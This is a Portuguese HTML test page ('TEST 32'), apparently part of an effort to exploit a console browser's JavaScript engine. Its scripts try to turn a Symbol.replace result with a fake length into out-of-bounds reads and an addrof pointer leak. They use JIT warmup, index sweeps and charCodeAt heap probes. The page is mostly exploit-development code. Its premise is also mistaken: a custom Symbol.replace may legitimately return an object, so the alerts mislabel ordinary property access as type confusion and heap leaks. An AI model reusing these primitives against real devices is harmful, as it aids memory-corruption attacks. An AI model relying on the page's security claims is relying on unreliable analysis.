<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 32 - Symbol.replace Type Confusion: Exploit Primitivo</title></head>
<body>
<h2>TEST 32 — Symbol.replace Type Confusion: Do `length=99999` ao OOB Read</h2>

<p><b>Achado original (TEST 20):</b> <code>str.replace(evilPattern, repl)</code> retornou um
<b>objeto</b> com <code>length=99999</code>. O motor leu <code>.length</code> do objeto como
se fosse comprimento de string — confirmando type confusion.</p>

<p><b>O que investigamos aqui:</b></p>
<ul>
  <li><b>32-A</b> Confirmar type confusion: usar o <code>length</code> falso para acessar índices OOB na string retornada</li>
  <li><b>32-B</b> Usar o resultado confundido em funções JIT-compiladas que assumem string</li>
  <li><b>32-C</b> Encadear Symbol.replace → substring/slice com length falso → OOB read potencial</li>
  <li><b>32-D</b> addrof primitivo: fazer o motor imprimir bits de ponteiro via length corrompido</li>
</ul>

<pre id="log">Pronto. Execute na ordem A → B → C → D.</pre>
<button onclick="runA()">32-A: CONFIRMAR CONFUSION</button>
<button onclick="runB()">32-B: JIT COM RESULTADO CONFUSED</button>
<button onclick="runC()">32-C: OOB VIA SUBSTRING</button>
<button onclick="runD()">32-D: ADDROF ATTEMPT</button>

<script>
var log = document.getElementById('log');
function info(m)  { log.textContent += '\n[INFO] ' + m; }
function alerta(m){ log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)    { log.textContent += '\n[OK]   ' + m; }
function sep()    { log.textContent += '\n' + '-'.repeat(60); }

// Helper: interpretar double como dois Uint32 (para addrof)
function f64ToHex(val) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = val;
  var u32 = new Uint32Array(buf);
  return '0x' + u32[1].toString(16).padStart(8,'0') + '_' + u32[0].toString(16).padStart(8,'0');
}

// ─── 32-A ────────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 32-A] Confirmar type confusion e medir o length falso...\n';
  sep();

  // Reproduzir o achado: Symbol.replace retorna objeto com length falso
  var FAKE_LENGTH = 99999;
  var evilPattern = {
    [Symbol.replace]: function(string, replacement) {
      // Retornar objeto em vez de string
      return {
        valueOf:  function() { return 'replaced'; },
        toString: function() { return 'replaced'; },
        length:   FAKE_LENGTH,  // comprimento falso
        0: 'r', 1: 'e', 2: 'p' // simular array-like
      };
    }
  };

  var original = 'hello world 123';
  var result = original.replace(evilPattern, 'X');

  info('original.length: ' + original.length);
  info('typeof result: ' + typeof result);
  info('result.length: ' + result.length);
  info('result.toString(): ' + result.toString());

  if(typeof result === 'object') {
    alerta('TYPE CONFUSION CONFIRMADA: replace() retornou objeto. result.length=' + result.length + ' (falso=' + FAKE_LENGTH + ')');

    // Verificar quais operacoes de string aceitam o resultado falso
    var ops = [
      { name: 'result.charAt(0)',         fn: function() { return result.charAt ? result.charAt(0) : 'N/A'; } },
      { name: 'result.indexOf("r")',       fn: function() { return result.indexOf ? result.indexOf('r') : 'N/A'; } },
      { name: 'result.slice(0,3)',         fn: function() { return result.slice ? result.slice(0,3) : 'N/A'; } },
      { name: 'result.substring(0,3)',     fn: function() { return result.substring ? result.substring(0,3) : 'N/A'; } },
      { name: 'result + ""',              fn: function() { return result + ''; } },
      { name: 'result[0]',                fn: function() { return result[0]; } },
      { name: 'result[FAKE_LENGTH-1]',    fn: function() { return result[FAKE_LENGTH-1]; } },
      { name: 'result[FAKE_LENGTH]',      fn: function() { return result[FAKE_LENGTH]; } },
    ];

    ops.forEach(function(op) {
      try {
        var r = op.fn();
        info(op.name + ': ' + JSON.stringify(r) + ' (typeof=' + typeof r + ')');
        if(r !== undefined && r !== null && op.name.includes('FAKE_LENGTH')) {
          alerta('ACESSO ALEM DO COMPRIMENTO REAL DO OBJETO: ' + op.name + ' = ' + JSON.stringify(r) + ' — OOB read no objeto-string!');
        }
      } catch(e) {
        info(op.name + ': EXCECAO — ' + e.message);
      }
    });
  } else {
    info('resultado e string (motor corrigido ou path diferente): "' + result + '"');
    info('Tentando forcas alternativas de type confusion...');
    // Tentar com warmup JIT
    runAJIT();
  }
}

function runAJIT() {
  info('\nTentando via JIT warmup + Symbol.replace...');
  var callN = 0;

  var lateEvil = {
    [Symbol.replace]: function(string, repl) {
      callN++;
      if(callN <= 100000) {
        // Durante warmup: retornar string normal para JIT especializar
        return string.split('o').join(repl);
      }
      // Apos JIT compilar: retornar objeto
      info('Symbol.replace call #' + callN + ': retornando objeto (pos-JIT)');
      return { length: 0x7FFFFFFF, poisoned: true, toString: function(){ return ''; } };
    }
  };

  // Funcao que sera JIT-compilada
  function processReplace(s) {
    var r = s.replace(lateEvil, 'X');
    return r.length; // JIT assume r e string
  }

  // Warmup
  for(var i = 0; i < 100001; i++) processReplace('hello world');
  info('JIT warmup (100001 calls) completo.');

  // Disparo pos-JIT
  try {
    var jitResult = processReplace('hello world');
    info('processReplace pos-JIT: ' + jitResult);
    if(jitResult === 0x7FFFFFFF) {
      alerta('JIT RETORNOU length FALSO DO OBJETO: ' + jitResult + ' (0x7FFFFFFF) — JIT nao verificou tipo do resultado de Symbol.replace!');
    } else if(jitResult > 1000) {
      alerta('length GRANDE RETORNADO: ' + jitResult + ' — JIT pos-warmup leu length do objeto!');
    }
  } catch(e) {
    alerta('EXCECAO no processReplace pos-JIT: ' + e.message + ' — deopt/crash detectado!');
  }
  info('callN total: ' + callN);
}

// ─── 32-B ────────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 32-B] Passar resultado confundido para funcoes JIT de string...\n';
  sep();

  // Criar o objeto-falso-de-string como o PS4 produziu
  var fakeString = {
    length:   99999,
    toString: function() { return 'real_content'; },
    valueOf:  function() { return 'real_content'; },
    charAt:   String.prototype.charAt,
    charCodeAt: String.prototype.charCodeAt,
    // Indices: apenas 3 chars reais, o resto e undefined
    0: 'r', 1: 'e', 2: 'p'
  };

  // Funcoes JIT que operam em strings — aquece com string real, depois passa fakeString
  function strLen(s)   { return s.length; }
  function strChar(s)  { return s.charCodeAt(0); }
  function strSlice(s) { return s.slice(0, 10); }
  function strConcat(s){ return s + '_suffix'; }
  function strSplit(s) { return s.split(''); }

  var fns = [
    { name: 'strLen',   fn: strLen   },
    { name: 'strChar',  fn: strChar  },
    { name: 'strSlice', fn: strSlice },
    { name: 'strConcat',fn: strConcat},
    { name: 'strSplit', fn: strSplit },
  ];

  // Aquecer cada funcao com string real
  info('Aquecendo funcoes com string real...');
  fns.forEach(function(f) {
    for(var i = 0; i < 50000; i++) f.fn('hello world test 123');
  });
  info('Warmup completo.');
  sep();

  // Passar fakeString (objeto) para funcoes JIT especializadas para string
  fns.forEach(function(f) {
    try {
      var r = f.fn(fakeString);
      info(f.name + '(fakeString): ' + JSON.stringify(r));
      if(f.name === 'strLen' && r === 99999) {
        alerta('strLen JIT RETORNOU 99999: funcao JIT leu .length do objeto como comprimento de string!');
      }
      if(f.name === 'strChar' && (r > 127 || r < 0)) {
        alerta('strChar JIT RETORNOU VALOR FORA DO ASCII: ' + r + ' — charCodeAt leu byte do objeto como char de string!');
      }
      if(f.name === 'strSplit' && Array.isArray(r) && r.length > 100) {
        alerta('strSplit PRODUZIU ' + r.length + ' ELEMENTOS: split usou length=99999 para alocar array!');
      }
    } catch(e) {
      alerta('EXCECAO em ' + f.name + '(fakeString): ' + e.message + ' — type check falhou no JIT path!');
    }
  });
}

// ─── 32-C ────────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 32-C] Encadear result confundido em substring/slice para OOB...\n';
  sep();

  var EVIL_LENGTH = 99999;
  var evilPattern = {
    [Symbol.replace]: function(str) {
      return {
        toString: function() { return 'x'; },
        length:   EVIL_LENGTH,
        0: 'x'
      };
    }
  };

  var base = 'abcdefghij'; // 10 chars reais
  var confused = base.replace(evilPattern, '');

  info('base.length: ' + base.length);
  info('confused.length: ' + confused.length + ' (real: 1 char ou objeto?)');
  info('typeof confused: ' + typeof confused);

  if(typeof confused !== 'object') {
    info('Motor corrigiu o tipo. Tentando via encadeamento...');
    // Tentar encadear dois Symbol.replace consecutivos
    var chain = base.replace(evilPattern, '').replace(evilPattern, '');
    info('chain.length: ' + chain.length + ' typeof: ' + typeof chain);
    confused = chain;
  }

  if(typeof confused === 'object' && confused.length === EVIL_LENGTH) {
    alerta('OBJETO COM length=' + EVIL_LENGTH + ' CONFIRMADO. Tentando OOB read...');

    // Tentar substring com offsets baseados no length falso
    var oobTests = [
      { start: 0,            end: EVIL_LENGTH,     label: 'slice(0, EVIL_LENGTH)' },
      { start: EVIL_LENGTH/2,end: EVIL_LENGTH,     label: 'slice(EVIL_LENGTH/2, EVIL_LENGTH)' },
      { start: EVIL_LENGTH-4,end: EVIL_LENGTH,     label: 'slice(last 4 bytes)' },
      { start: EVIL_LENGTH,  end: EVIL_LENGTH+100, label: 'slice(EVIL_LENGTH, +100) — alem do falso' },
    ];

    oobTests.forEach(function(t) {
      try {
        var method = confused.slice || confused.substring || String.prototype.slice.bind(confused);
        var result = String.prototype.slice.call(confused, t.start, t.end);
        info(t.label + ': length=' + result.length + ' | "' + result.slice(0,20) + '"');
        if(result.length > 0 && t.start >= 3) {
          alerta('OOB READ POTENCIAL: ' + t.label + ' retornou ' + result.length + ' chars fora do conteudo real do objeto! Conteudo: "' + result.slice(0,50) + '"');
        }
      } catch(e) {
        info(t.label + ': EXCECAO — ' + e.message);
      }
    });

    // Tentar indexar cada posicao ate encontrar dado nao-undefined
    info('\nVarredura de indices OOB...');
    var lastDefined = 2; // sabemos que 0,1,2 existem
    var firstGarbage = -1;
    for(var i = 3; i < 100; i++) {
      var v = confused[i];
      if(v !== undefined) {
        firstGarbage = i;
        alerta('INDICE OOB [' + i + '] NAO E UNDEFINED: "' + v + '" — leitura alem do objeto!');
        break;
      }
    }
    if(firstGarbage === -1) {
      ok('Indices [3..99] todos undefined (sem OOB obvio na varredura curta)');
    }
  } else {
    ok('Objeto nao foi produzido neste run. Tente 32-A primeiro.');
  }
}

// ─── 32-D ────────────────────────────────────────────────────────────────────
function runD() {
  log.textContent = '[TEST 32-D] Tentativa de addrof via length corrompido...\n';
  sep();
  info('Objetivo: fazer o motor calcular um offset de memoria baseado no length falso');
  info('e retornar um valor que revele bits de ponteiro como chars de string.\n');

  // Tecnica: se o motor usa length=99999 para calcular buffer interno de string,
  // um acesso a str[N] com N grande pode cair no heap e retornar um byte de ponteiro

  // Alvo: objeto com ponteiro para Float64Array (sabemos o layout)
  var targetBuf = new ArrayBuffer(8);
  var targetF64 = new Float64Array(targetBuf);
  var targetU32 = new Uint32Array(targetBuf);
  var SENTINEL = 1.337e308; // valor sentinela facilmente reconhecível
  targetF64[0] = SENTINEL;

  info('Sentinel: ' + SENTINEL + ' | bits: ' + f64ToHex(SENTINEL));

  var EVIL_LEN = 0x10000; // 64KB — grande o suficiente para cobrir heap vizinho

  var leakPattern = {
    [Symbol.replace]: function(str) {
      return {
        toString: function() { return ''; },
        length:   EVIL_LEN,
        target:   targetF64, // referencia ao objeto-alvo no heap do objeto resultado
        0: 'X'
      };
    }
  };

  var base = 'probe_string_for_leak';
  var confused = base.replace(leakPattern, '');

  info('confused.length: ' + confused.length);
  info('typeof confused: ' + typeof confused);

  if(typeof confused !== 'object') {
    info('Objeto nao produzido. Tentando via forceamento de JIT...');
    return;
  }

  alerta('OBJETO COM length=0x' + EVIL_LEN.toString(16) + ' PRODUZIDO. Iniciando probe de heap...');

  // Probe: varrer indices ate encontrar valor que nao seja undefined
  // Em um ambiente vulneravel, indices alem do objeto poderiam cair no heap
  var probed = [];
  var PROBE_LIMIT = 256;

  for(var i = 0; i < PROBE_LIMIT; i++) {
    try {
      var v = confused[i];
      if(v !== undefined && i > 0) {
        probed.push({ idx: i, val: v });
        if(typeof v === 'string' && v.charCodeAt) {
          var code = v.charCodeAt(0);
          info('confused[' + i + '] = "' + v + '" | charCode=' + code + ' | 0x' + code.toString(16));
        }
      }
    } catch(e) {
      info('confused[' + i + ']: EXCECAO — ' + e.message);
      break;
    }
  }

  info('\nResultados do probe (' + PROBE_LIMIT + ' indices):');
  info('Indices nao-undefined encontrados: ' + probed.length);
  if(probed.length > 1) {
    alerta('DADOS ENCONTRADOS EM INDICES ALEM DO OBJETO: ' + probed.length + ' posicoes com valor! Possivel leitura de heap via length corrompido. Indices: ' + probed.map(function(p){return p.idx;}).join(', '));
  } else {
    ok('Apenas indice 0 definido — sem OOB via probe de 0..255');
    info('O primitivo pode exigir JIT warmup primeiro (teste 32-B) antes do probe.');
  }

  // Ultima tentativa: String.fromCharCode sobre charCodeAt do resultado
  info('\nTentando charCodeAt em indices OOB via String.prototype.charCodeAt...');
  try {
    var codes = [];
    for(var j = 0; j < 16; j++) {
      var code = String.prototype.charCodeAt.call(confused, j);
      codes.push('0x' + code.toString(16));
    }
    info('charCodeAt [0..15]: ' + codes.join(' '));
    // Se algum valor nao e NaN e nao corresponde ao conteudo real do objeto,
    // e um leak de bytes do heap
    var nonNaN = codes.filter(function(c) { return c !== '0xNaN' && c !== 'NaN'; });
    if(nonNaN.length > 3) {
      alerta('charCodeAt RETORNOU ' + nonNaN.length + ' VALORES NAO-NaN: ' + nonNaN.join(' ') + ' — bytes do heap vazando via charCodeAt em objeto-string!');
    }
  } catch(e) {
    alerta('charCodeAt LANCOU EXCECAO: ' + e.message + ' — acesso invalido ao buffer interno!');
  }
}
</script>
</body>
</html>
